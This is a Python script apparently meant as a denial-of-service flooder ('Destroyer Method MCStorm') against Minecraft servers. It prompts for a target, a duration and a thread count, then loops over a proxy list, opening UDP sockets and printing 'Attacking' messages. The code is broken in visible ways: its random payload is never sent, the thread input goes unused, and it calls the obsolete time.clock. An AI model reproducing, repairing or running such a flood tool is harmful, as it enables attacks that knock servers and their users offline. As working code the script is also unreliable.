#Destroyer Method MCStorm
#Coded by GhostyCeh


import socket
import time
import threading
import random
import sys
import os
import requests
import mcstatus
from mcstatus import MinecraftServer
import colorama
from colorama import *

os.system("clear")

def main():
    global victima
    global tiempo
    global lista
    global s
    tiempo = int(input("[Destroyer] Tiempo (Segundos): "))
    lista = 'proxy.txt'
    thr = input("[Destroyer] Threads: ")
    victima = input("[Destroyer] Victima: ")
    pprr = open(lista).readlines()
    atk()

def atk():
    reloj=(lambda:0,time.clock)[tiempo>0]
    duracion=(1,(reloj()+tiempo))[tiempo>0]
    bytes = random._urandom(5000)
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        pprr = open(lista).readlines()
        server = MinecraftServer.lookup(victima)
        status = server.status()
        if reloj()<duracion:
            proxy = random.choice(pprr).split(":")
            s.connect((str(proxy[0]), int(proxy[1])))
            print("[Destroyer] Attacking " + str(victima) + " // Pinging from - " + str(proxy[0]) + ":" + str(proxy[1]))
        else:
            exit()


main()

